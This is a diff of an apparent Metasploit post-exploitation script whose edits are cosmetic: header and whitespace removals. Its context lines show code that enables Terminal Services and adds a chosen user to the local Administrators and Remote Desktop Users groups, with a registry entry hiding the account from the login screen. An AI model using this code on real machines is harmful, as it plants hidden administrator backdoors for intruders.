@@ -1,5 +1,3 @@
-# $Id$
-# $Revision$
 # Author: Carlos Perez at carlos_perez[at]darkoperator.com
 #-------------------------------------------------------------------------------
 ################## Variable Declarations ##################
@@ -67,7 +65,7 @@ def enabletssrv()
 			file_local_write(@dest,"execute -H -f cmd.exe -a \"/c sc config termservice start= disabled\"")
 			cmd_exec("sc start termservice")
 			file_local_write(@dest,"execute -H -f cmd.exe -a \"/c sc stop termservice\"")
-			
+
 		else
 			print_status "\tTerminal Services service is already set to auto"
 		end
@@ -83,7 +81,7 @@ end
 
 
 def addrdpusr(session, username, password)
-		
+
 	rdu = resolve_sid("S-1-5-32-555")[:name]
 	admin = resolve_sid("S-1-5-32-544")[:name]
 
@@ -100,7 +98,7 @@ def addrdpusr(session, username, password)
 			file_local_write(@dest,"reg deleteval -k HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\ NT\\\\CurrentVersion\\\\Winlogon\\\\SpecialAccounts\\\\UserList -v #{username}")
 			print_status "\tAdding User: #{username} to local group '#{rdu}'"
 			cmd_exec("cmd.exe","/c net localgroup \"#{rdu}\" #{username} /add")
-		
+
 			print_status "\tAdding User: #{username} to local group '#{admin}'"
 			cmd_exec("cmd.exe","/c net localgroup #{admin}  #{username} /add")
 			print_status "You can now login with the created user"
